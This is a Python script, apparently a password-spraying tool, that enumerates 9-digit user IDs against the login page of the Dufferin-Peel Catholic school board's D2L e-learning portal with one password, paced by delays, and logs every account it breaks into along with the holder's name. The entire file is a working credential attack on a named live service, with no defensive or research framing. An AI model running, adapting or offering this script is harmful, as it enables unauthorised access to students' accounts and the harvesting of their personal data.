import requests
import sys
import time
import xml.etree.ElementTree as etree
from bs4 import BeautifulSoup

username = ''

config = etree.parse(str(sys.argv[1]))
root = config.getroot()
found = 0

curChunk = 0

childCount = 0
for child in root:
    if(childCount == 0):
        password = child.text
    elif(childCount == 1):
        start = child.text
    elif(childCount == 2):
        end = child.text
    elif(childCount == 3):
        mark = int(child.text)
    elif(childCount == 4):
        startDelay = int(child.text)
    elif(childCount == 5):
        delay = int(child.text)
    elif(childCount == 6):
        chunkSet = int(child.text)
    childCount += 1

outFile = open('out.txt', 'a')
outFile.write('\n')

time.sleep(startDelay);

sess = requests.Session()

login_data = {
    'd2l_referrer': '',
    'target': '/d2l/home',
    'loginPath': '/d2l/login',
    'userName': '',
    'password': ''
}

login_data['password'] = password

for i in range(int(start), (int(start) + int(end))):
    if(curChunk == chunkSet):
        print('\t\tBeginning Sleep of: ' + str(delay) + 's')
        time.sleep(delay)
        print('\t\tEnded Sleep')
        curChunk = 0
    
    if(start[0] == '0'):
        login_data['userName'] = str(i).zfill(9)
    else:
        login_data['userName'] = i
    
    page = sess.post('https://dpcdsb.elearningontario.ca/d2l/lp/auth/login/login.d2l', data=login_data)

    soup = BeautifulSoup(page.content, 'html.parser')

    if((i - int(start)) % mark == 0):
        print('\t\tMARK: ' + str(i - int(start)))
        outFile.close()
        outFile = open('out.txt', 'a')
        
    if(str(soup.title) == '<title>Homepage - Dufferin-Peel CDSB</title>'):
        found += 1
        print('Found @ ' + str(i - int(start)))
        name = soup.find('h1')
        tempName = name.contents
        outFile.write(str(i).zfill(9) + " " + password + " " + str(tempName[0][56: len(tempName[0])]) + '\n')
    curChunk += 1

outFile.write('\nSession: ' + start + ' - ' + str(int(start) + int(end)) + ' ' + str(found) + ' Users with password: ' + password + '\n')
outFile.close()
input('\nSession: ' + start + ' - ' + str(int(start) + int(end)) + ' ' + str(found) + ' Users with password: ' + password)
